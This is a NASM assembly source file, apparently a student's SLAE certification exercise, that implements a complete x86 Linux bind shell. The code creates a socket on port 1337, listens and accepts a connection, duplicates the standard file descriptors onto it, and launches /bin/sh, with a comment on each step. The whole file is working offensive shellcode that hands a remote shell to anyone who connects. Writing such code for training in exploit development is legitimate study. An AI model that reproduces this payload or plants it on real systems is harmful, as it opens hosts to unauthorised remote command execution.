; Title: BindShell.nasm
; Author: Muhann4d
; StudentID: SLAE-887

global _start

section .text

_start:


	; int socketcall(int call, unsigned long *args);
	; int socket(int socket_family, int socket_type, int protocol);


	xor eax, eax		; zero out eax as we dont know what value it holds
	mov ebx, eax		; zero out ebx by moving the eax value to it
	push eax		; push eax value (zero) to the stack for last arg (LIFO)
	mov al,0x66		; set the value of socketcall 102 to eax
	inc ebx			; increase ebx by one for 
	push byte 0x1		; push 1 to the stack for 2nd arg (LIFO)
	push byte 0x2		; push 2 to the stack for 3nd arg (LIFO)
	mov ecx, esp		; set esp (agrs) to ecx
	int 0x80		; exec the syscall


	; int socketcall(int call, unsigned long *args);
	; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);


	mov edx, eax		; set returned eax value (sockfd) to edx
	push 0x66		; push 102 to stack (socketcall 102)
	pop eax			; pop 0x66 (socketcall 102) in eax
	pop ebx			; pop the value 0x2 from stack to ebx
	pop ecx			; pop the value 0x1 from stack for ecx (to burn it)
	push word 0x3905	; push the value of the port to the stack (1337)
	push word bx		; push bx value (2) to stack 
	mov ecx, esp		; save the esp to ecx
	push 0x10		; push address length (16) to stack
	push ecx		; push esp address we that saved above to the stack 
	push edx		; push sockfd to the stack
	mov ecx, esp		; save new esp address to ecx
	int 0x80		; exec bind
	

	; int socketcall(int call, unsigned long *args);
	; int listen(int sockfd, int backlog);


	mov al, 0x66			; set eax vlaue to 102 (socketcall) 
	mov bl, 0x4			; set ebx value to 4 (listen)
	xor esi, esi			; zero out esi as we dont know the value in it
	push esi			; push esi value to stack (0)
	push edx			; push edx to stack which holds the sockfd value
	mov ecx, esp			; save esp value to ecx
	int 0x80			; exec listen


	; int socketcall(int call, unsigned long *args);
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)


	push esi			; push esi value to stack that we zeroed above
	push esi			; push esi value to stack that we zeroed above
	push edx			; push edx to stack which has the sockfd value
	mov al, 0x66			; set eax vlaue to 102 (socketcall)
	inc ebx				; increase ebx value by one for (accept)to be(5)
	mov ecx, esp			; save esp value to ecx
	int 0x80			; exec accept


	; int socketcall(int call, unsigned long *args);
	; int dup2(int oldfd, int newfd);

 	
	mov ebx, eax			; Set ebx to the return value of our (accept)
	xor ecx, ecx			; zero ecx value
	mov cl, 0x2			; set ecx to 2 (counter)
loop:
	mov al, 0x3f   			; set eax vlaue to 63 (dup2) 
	int 0x80   			; exec dup2
	dec ecx    			; Decrement counter
	jns loop   			; as long as SF is not set, jmp to loop


	; int execve(const char *filename, char *const argv[],char *const envp[]);


 	xor eax, eax		   	; zero eax value
 	push eax			; push eax value (0) to the stack 
 	push dword 0x68732f2f  		; push "//sh" to the stack
 	push dword 0x6e69622f  		; push "/bin" to the stack
 	mov ebx, esp   		   	; set ebx to our stack pointer
 	mov al, 0xb			; set eax value to 11 (execeve)
	xor ecx, ecx			; zero ecx
	mov edx, ecx			; zero edx
 	int 0x80   			; exec execve
